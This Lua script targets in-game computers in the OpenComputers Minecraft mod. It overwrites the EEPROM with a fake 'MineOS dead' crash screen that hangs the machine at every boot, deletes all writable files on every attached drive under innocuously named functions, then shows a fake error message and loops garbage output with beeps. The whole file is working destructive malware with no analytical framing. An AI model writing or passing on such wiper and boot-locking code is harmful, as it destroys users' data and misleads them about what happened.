local component = require("component")
local fs = require("filesystem")
local computer = require("computer")
local unicode = require("unicode")
 
local color = "emlpdr"
 
local Code = [[
 
local textLines = {
  "An a critical error occured and your MineOS has been stopped",
  "Try to restart your computer If this screen appears again Try to do this",
  "1 Purchase normal computer",
  "2 Use new BIOS",
  "3 Reinstall system",
  "Or contact your Lua Programmer",
  "THIS_IS_RIPSOD",
  "TECHNICAL_INFORMATION",
  "GOPSTOP TOP STOP 5x133713371 0x0000000000 0x00000000003 0x2282282282",
}
 
local component_invoke = component.invoke
function boot_invoke(address, method, ...)
  local result = table.pack(pcall(component_invoke, address, method, ...))
  if not result[1] then
    return nil, result[2]
  else
    return table.unpack(result, 2, result.n)
  end
end
 
local eeprom = component.list("eeprom")()
computer.getBootAddress = function()
  return boot_invoke(eeprom, "getData")
end
computer.setBootAddress = function(address)
  return boot_invoke(eeprom, "setData", address)
end
 
do
  _G.screen = component.list("screen")()
  _G.gpu = component.list("gpu")()
  if gpu and screen then
    boot_invoke(gpu, "bind", screen)
  end
end
 
local function centerText(mode,coord,text)
  local dlina = unicode.len(text)
  local xSize,ySize = boot_invoke(gpu, "getResolution")
 
  if mode == "x" then
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),coord,text)
  elseif mode == "y" then
    boot_invoke(gpu, "set", coord, math.floor(ySize/2),text)
  else
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)
  end
end
 
local function suck()
  local background, foreground = 0x0000AA, 0xCCCCCC
  local xSize, ySize = boot_invoke(gpu, "getResolution")
  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "fill", 1, 1, xSize, ySize, " ")
 
  boot_invoke(gpu, "setBackground", foreground)
  boot_invoke(gpu, "setForeground", background)
 
  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)
  centerText("x", y, " Your МАЯНЕЗ Dead! ")
  y = y + 2
 
  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "setForeground", foreground)
 
  for i = 1, #textLines do
    centerText("x", y, textLines[i])
    y = y + 1
  end
 
  while true do
    computer.pullSignal()
  end
end
 
if gpu then suck() end
]]
 
function parseProxy(address)
    local proxy = component.proxy(address)
    local list = proxy.list("")
    for _, file in pairs(list) do
        if type(file) == "string" then
            if not proxy.isReadOnly(file) then proxy.remove(file) end
        end
    end
    list = nil
end
 
function parseAllAddresess()
    for address in component.list("filesystem") do
      local proxy = component.proxy(address)
      if proxy.address ~= computer.tmpAddress() and proxy.getLabel() ~= "internet" then
        parseProxy(proxy.address)    
      end
    end
end
 
component.eeprom.set(Code)
parseAllAddresess()
 
print("Oops! An a critical error has been occured!")

while true do
  local str = ""
    for j = 1, 160 do
      str = str .. unicode.char(math.random(0, 255))
    end
  print(str)
  computer.beep(1000, 0.1)
end
